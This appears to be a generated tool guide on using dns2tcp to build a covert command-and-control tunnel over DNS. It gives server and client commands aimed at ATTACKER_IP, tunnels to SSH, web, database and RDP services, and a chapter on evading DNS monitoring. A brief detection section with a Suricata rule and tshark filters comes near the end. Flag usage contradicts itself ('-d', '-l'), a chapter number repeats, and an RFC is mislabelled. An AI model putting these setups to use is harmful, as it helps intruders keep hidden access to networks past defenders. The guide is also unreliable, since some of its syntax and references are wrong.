---
title: "dns2tcp - TCP over DNS Tunnel"
description: "Tunnel TCP connections through DNS queries using DNS TXT, NULL, or ANY record types"
category: "tunneling"
mitre_tactic: command_and_control
mitre_tactic_id: TA0011
package: "dns2tcp"
kali_install: "sudo apt install dns2tcp"
---

# dns2tcp

## Overview

dns2tcp tunnels TCP connections through DNS queries. It encapsulates TCP data within DNS queries and responses, using TXT, NULL, or ANY record types. dns2tcp is designed for environments where only DNS resolution is permitted, providing a covert channel for command and control operations.

dns2tcp works by encoding TCP data into DNS queries and decoding responses. The client sends DNS queries to the attacker's domain, and the server responds with encoded data. This creates a bidirectional channel through DNS traffic that appears as normal DNS resolution.

The tool supports multiple record types (TXT, NULL, ANY), authentication via pre-shared keys, and multiple simultaneous connections. It is particularly useful for establishing C2 channels in highly restrictive network environments.

## Chapter 1: Installation

### Kali Linux

```bash
sudo apt update
sudo apt install dns2tcp
```

### From Source

```bash
git clone https://github.com/longld/dns2tcp.git
cd dns2tcp
make
sudo make install
```

### Verify Installation

```bash
dns2tcp -h
```

### Check Dependencies

```bash
# dns2tcp requires a DNS server
# Verify DNS resolution works
dig example.com
```

## Chapter 2: Basic Usage

### Start Server

```bash
dns2tcp -f /etc/dns2tcpd.conf -i ATTACKER_IP -p 53
```

**Explanation**: Starts the dns2tcp server using the configuration file. The `-i` flag specifies the listening IP, and `-p` sets the DNS port. The server listens for DNS queries and establishes TCP connections to configured targets.

### Configuration File

```
# /etc/dns2tcpd.conf
listen = 0.0.0.0
port = 53
domain = tunnel.example.com
key = secretkey
resources = ssh:127.0.0.1:22, http:127.0.0.1:80
```

**Explanation**: The configuration defines the listening address, port, domain for DNS queries, shared key, and resource mappings. Resources map local port names to remote host:port combinations.

### Connect Client

```bash
dns2tcp -r ssh -k secretkey -d ATTACKER_IP
```

**Explanation**: The `-r` flag specifies the resource to connect to (mapped in the server config), `-k` provides the shared key, and `-d` specifies the DNS server IP.

### Verify Connection

```bash
# Check if local port is listening
ss -tlnp | grep 2222

# Test SSH through tunnel
ssh -p 2222 user@127.0.0.1
```

**Explanation**: Verify the tunnel is working by checking the local port and testing SSH connectivity.

## Chapter 3: DNS Tunneling Concepts

### How DNS Tunneling Works

DNS tunneling encodes TCP data within DNS queries. The client sends DNS queries to the attacker's domain, and the server responds with encoded data. This creates a bidirectional channel through DNS traffic.

**Explanation**: DNS queries normally resolve hostnames to IP addresses. DNS tunneling repurposes the query/response mechanism to carry arbitrary data, bypassing firewalls that permit DNS resolution.

### Record Types

```bash
# TXT records (most common)
dns2tcp -r ssh -k key -d ATTACKER_IP -t TXT

# NULL records
dns2tcp -r ssh -k key -d ATTACKER_IP -t NULL

# ANY records
dns2tcp -r ssh -k key -d ATTACKER_IP -t ANY
```

**Explanation**: Different DNS record types carry different amounts of data per query. TXT records typically support larger payloads, while NULL records may be less monitored by security devices.

### Record Type Comparison

| Record Type | Payload Size | Stealth | Compatibility |
|-------------|--------------|---------|---------------|
| TXT | 255 bytes | Medium | High |
| NULL | 65535 bytes | Low | Medium |
| ANY | 255 bytes | Low | High |
| MX | 255 bytes | Low | Medium |
| CNAME | 255 bytes | Low | High |

**Explanation**: Choose the record type based on your requirements for payload size, stealth, and compatibility with DNS infrastructure.

## Chapter 4: Server Configuration

### Basic Server Config

```
listen = 0.0.0.0
port = 53
domain = tunnel.example.com
key = secretkey
resources = ssh:127.0.0.1:22
```

**Explanation**: The server listens for DNS queries for `tunnel.example.com` on port 53. When it receives a query with the correct key, it establishes a TCP connection to `127.0.0.1:22` and tunnels the data.

### Multiple Resources

```
resources = ssh:10.0.0.1:22, web:10.0.0.2:80, db:10.0.0.3:3306
```

**Explanation**: Multiple resources can be configured, each mapped to a different target. Clients specify which resource to use when connecting.

### Forwarding Mode

```
forward = yes
```

**Explanation**: When forwarding is enabled, the server forwards non-dns2tcp DNS queries to upstream DNS servers. This allows the DNS server to function normally while also handling tunnel traffic.

### Advanced Configuration

```
# /etc/dns2tcpd.conf
listen = 0.0.0.0
port = 53
domain = tunnel.example.com
key = secretkey
resources = ssh:127.0.0.1:22, web:127.0.0.1:80
forward = yes
upstream = 8.8.8.8
debug = 3
log = /var/log/dns2tcp.log
```

**Explanation**: Advanced configuration includes upstream DNS server for forwarding, debug logging, and log file location.

### DNS Server Setup

```bash
# BIND named.conf
zone "example.com" {
    type master;
    file "example.com.zone";
    allow-query { any; };
};

# Zone file
$TTL 300
@ IN SOA ns1.example.com. admin.example.com. (
    2024010101 3600 900 604800 86400 )
@ IN NS ns1.example.com.
ns1 IN A ATTACKER_IP
tunnel IN A ATTACKER_IP
```

**Explanation**: Configure an authoritative DNS server to handle queries for your tunnel domain. The server must respond to queries for the tunnel domain.

## Chapter 5: Client Usage

### SSH Tunnel

```bash
# Start dns2tcp client
dns2tcp -r ssh -k secretkey -d ATTACKER_IP -p 53 -l 127.0.0.1:2222

# Connect via SSH
ssh -p 2222 user@127.0.0.1
```

**Explanation**: The client creates a local port 2222 that tunnels through DNS to the remote SSH server. SSH connections to localhost:2222 are tunneled through DNS queries to the attacker's domain.

### HTTP Tunnel

```bash
dns2tcp -r web -k secretkey -d ATTACKER_IP -l 127.0.0.1:8080
```

**Explanation**: Creates a local port 8080 that tunnels HTTP traffic through DNS to the remote web server.

### Database Tunnel

```bash
dns2tcp -r db -k secretkey -d ATTACKER_IP -l 127.0.0.1:3306
```

**Explanation**: Tunnels database connections through DNS. Connect to the database using the local port.

### Multiple Tunnels

```bash
# Terminal 1: SSH
dns2tcp -r ssh -k secretkey -d ATTACKER_IP -l 127.0.0.1:2222

# Terminal 2: HTTP
dns2tcp -r web -k secretkey -d ATTACKER_IP -l 127.0.0.1:8080

# Terminal 3: Database
dns2tcp -r db -k secretkey -d ATTACKER_IP -l 127.0.0.1:3306
```

**Explanation**: Multiple dns2tcp instances can run simultaneously, each tunneling a different service through DNS.

## Chapter 6: Performance

### Bandwidth Limitations

DNS tunneling has inherent bandwidth limitations due to:
- DNS query/response size limits (typically 512 bytes for UDP, 4096 for TCP)
- Network latency for each query/response pair
- Rate limiting by DNS resolvers

**Explanation**: DNS tunneling is not suitable for large data transfers. It is best used for lightweight C2 channels, SSH tunnels, and low-bandwidth applications.

### Optimization

```bash
# Use TCP DNS for larger payloads
dns2tcp -r ssh -k key -d ATTACKER_IP -p 53 -T

# Reduce query frequency
dns2tcp -r ssh -k key -d ATTACKER_IP -p 53 -i 100
```

**Explanation**: TCP DNS allows larger payloads than UDP DNS. The `-i` flag sets the interval between queries, allowing tuning of throughput vs. stealth.

### Throughput Testing

```bash
# Test SSH throughput
dd if=/dev/zero bs=1M count=1 | ssh -p 2222 user@127.0.0.1 "cat > /dev/null"

# Test with iperf
iperf -c 127.0.0.1 -p 2222
```

**Explanation**: Measure tunnel throughput using real-world applications. DNS tunneling bandwidth is typically limited to tens of kbps.

### Latency

```bash
# Test DNS latency
time dig @127.0.0.1 tunnel.example.com

# Test tunnel latency
time ssh -p 2222 user@127.0.0.1 "echo test"
```

**Explanation**: DNS tunneling adds significant latency due to the query/response exchange. The additional latency depends on DNS server response times.

## Chapter 7: Evasion

### DNS Traffic Analysis

DNS tunneling traffic can be detected by:
- Unusual query frequency
- High-entropy domain names
- Large DNS responses
- Non-standard record types

**Explanation**: Security monitoring tools analyze DNS traffic patterns. Using domain generation algorithms (DGA) and varying query patterns can reduce detection risk.

### Domain Configuration

```
domain = cdn.assets.example.com
```

**Explanation**: Using a domain name that resembles legitimate CDN or asset domains can help the tunnel traffic blend with normal DNS queries.

### Evasion Techniques

```bash
# Use common subdomains
domain = mail.example.com

# Vary query types
dns2tcp -r ssh -k key -d ATTACKER_IP -t TXT
dns2tcp -r ssh -k key -d ATTACKER_IP -t NULL

# Use DGA (Domain Generation Algorithm)
# Implement custom DGA in client script
```

**Explanation**: Varying query types and using DGA can make dns2tcp traffic harder to detect.

### DNS Monitoring Evasion

```bash
# Use legitimate-looking queries
# Add random subdomain prefixes
# Mimic legitimate DNS patterns

# Example: queries look like normal DNS resolution
dig a1b2c3.cdn.example.com
dig d4e5f6.assets.example.com
```

**Explanation**: Making dns2tcp traffic look like legitimate DNS queries reduces detection risk.

## Chapter 8: Security

### Authentication

```
# Server configuration
key = secretkey

# Client connection
dns2tcp -r ssh -k secretkey -d ATTACKER_IP
```

**Explanation**: The pre-shared key provides authentication and encryption. Both server and client must use the same key.

### Key Management

```bash
# Generate strong key
openssl rand -hex 32 > tunnel.key

# Use in server config
key = $(cat tunnel.key)

# Use in client
dns2tcp -r ssh -k $(cat tunnel.key) -d ATTACKER_IP
```

**Explanation**: Use strong, random keys for authentication. Store keys securely and distribute through secure channels.

### Encryption

dns2tcp encrypts tunnel data using the pre-shared key. The encryption prevents casual inspection of tunnel contents.

**Explanation**: While dns2tcp provides encryption, the encryption strength depends on the key and algorithm used. Use strong keys for sensitive data.

## Chapter 9: Troubleshooting

### Connection Issues

```bash
# Test DNS resolution
dig tunnel.example.com

# Check server logs
dns2tcp -f /etc/dns2tcpd.conf -i 0.0.0.0 -p 53 -d 3

# Debug client
dns2tcp -r ssh -k key -d ATTACKER_IP -d 3
```

**Explanation**: The `-d` flag with a number enables debug logging. Higher numbers provide more verbose output, helping identify connection and tunneling issues.

### DNS Resolution Issues

```bash
# Test DNS server
dig @ATTACKER_IP tunnel.example.com

# Check DNS server is running
ss -ulnp | grep 53

# Verify zone configuration
dig @ATTACKER_IP tunnel.example.com ANY
```

**Explanation**: Ensure DNS resolution is working correctly for the tunnel domain.

### Performance Issues

```bash
# Check DNS latency
dig @127.0.0.1 tunnel.example.com | grep "Query time"

# Monitor tunnel throughput
iftop -i eth0

# Adjust query interval
dns2tcp -r ssh -k key -d ATTACKER_IP -i 50
```

**Explanation**: Optimize tunnel performance by adjusting query intervals and monitoring network conditions.

### Authentication Errors

```bash
# Verify key matches
# Check server config
grep key /etc/dns2tcpd.conf

# Test with debug mode
dns2tcp -r ssh -k wrongkey -d ATTACKER_IP -d 3
```

**Explanation**: Ensure the pre-shared key matches between server and client.

## Chapter 10: Advanced Configuration

### Multiple Resource Types

```bash
# Server configuration with multiple resources
listen = 0.0.0.0
port = 53
domain = tunnel.example.com
key = secretkey
resources = ssh:127.0.0.1:22, http:127.0.0.1:80, mysql:127.0.0.1:3306, rdp:127.0.0.1:3389

# Client connecting to different resources
dns2tcp -r ssh -k secretkey -d ATTACKER_IP -l 127.0.0.1:2222
dns2tcp -r http -k secretkey -d ATTACKER_IP -l 127.0.0.1:8080
dns2tcp -r mysql -k secretkey -d ATTACKER_IP -l 127.0.0.1:3306
```

### Forwarding Mode Configuration

```bash
# Server with DNS forwarding
listen = 0.0.0.0
port = 53
domain = tunnel.example.com
key = secretkey
resources = ssh:127.0.0.1:22
forward = yes
forward_server = 8.8.8.8
forward_server = 8.8.4.4
```

### Performance Tuning

```bash
# Optimize for throughput
dns2tcp -r ssh -k key -d ATTACKER_IP -i 50 -T

# Optimize for stealth (lower frequency)
dns2tcp -r ssh -k key -d ATTACKER_IP -i 200

# Optimize for reliability
dns2tcp -r ssh -k key -d ATTACKER_IP -i 100 -T
```

### Logging Configuration

```bash
# Server logging
dns2tcp -f /etc/dns2tcpd.conf -i 0.0.0.0 -p 53 -l /var/log/dns2tcp.log -d 2

# Client logging
dns2tcp -r ssh -k key -d ATTACKER_IP -l /tmp/dns2tcp-client.log -d 2
```

## Chapter 10: Detection and Defense

### Network Signatures

- High volume of DNS queries to single domain
- Unusual DNS record types (TXT, NULL)
- Large DNS responses
- Consistent query patterns

### IDS/IPS Detection

```
# Suricata rule for dns2tcp
alert udp any any -> any 53 (msg:"DNS Tunnel C2"; \
  content:"tunnel.example.com"; \
  threshold:type both,track by_src, count 50, seconds 60; \
  sid:1000001; rev:1;)
```

### Log Analysis

```bash
# Monitor DNS query volume
tcpdump -i eth0 port 53 -w dns.pcap

# Analyze with tshark
tshark -r dns.pcap -Y "dns.qry.name contains tunnel.example.com"

# Check for large DNS responses
tshark -r dns.pcap -Y "dns.len > 512"
```

### Defense Recommendations

1. Implement DNS response policy zones (RPZ)
2. Monitor for high-volume DNS queries to single domains
3. Use DNS security extensions (DNSSEC)
4. Implement DNS query rate limiting
5. Monitor for unusual DNS record types

## Chapter 11: Command Reference

### Server Options

| Option | Description | Default |
|--------|-------------|---------|
| `-f` | Configuration file | /etc/dns2tcpd.conf |
| `-i` | Listening IP | 0.0.0.0 |
| `-p` | Listening port | 53 |
| `-d` | Debug level | 0 |

### Client Options

| Option | Description | Default |
|--------|-------------|---------|
| `-r` | Resource name | required |
| `-k` | Encryption key | required |
| `-d` | DNS server IP | required |
| `-p` | DNS port | 53 |
| `-l` | Local listen address | 127.0.0.1:2222 |
| `-t` | DNS record type | TXT |
| `-T` | Use TCP DNS | false |
| `-i` | Query interval (ms) | 50 |

### Configuration File Options

| Option | Description | Default |
|--------|-------------|---------|
| `listen` | Listening IP | 0.0.0.0 |
| `port` | Listening port | 53 |
| `domain` | Tunnel domain | required |
| `key` | Encryption key | required |
| `resources` | Resource mappings | required |
| `forward` | Forward other DNS | no |
| `upstream` | Upstream DNS server | 8.8.8.8 |

## Resources

- [dns2tcp Homepage](https://www.kali.org/tools/dns2tcp/)
- [DNS Tunneling Techniques](https://en.wikipedia.org/wiki/DNS_tunneling)
- [RFC 1035 - DNS](https://tools.ietf.org/html/rfc1035)
- [dns2tcp GitHub](https://github.com/longld/dns2tcp)
- [RFC 6698 - DNS over TCP](https://tools.ietf.org/html/rfc6698)
- [MITRE ATT&CK Command and Control](https://attack.mitre.org/tactics/TA0011/)
- [DNS Security RFC 4033](https://tools.ietf.org/html/rfc4033)
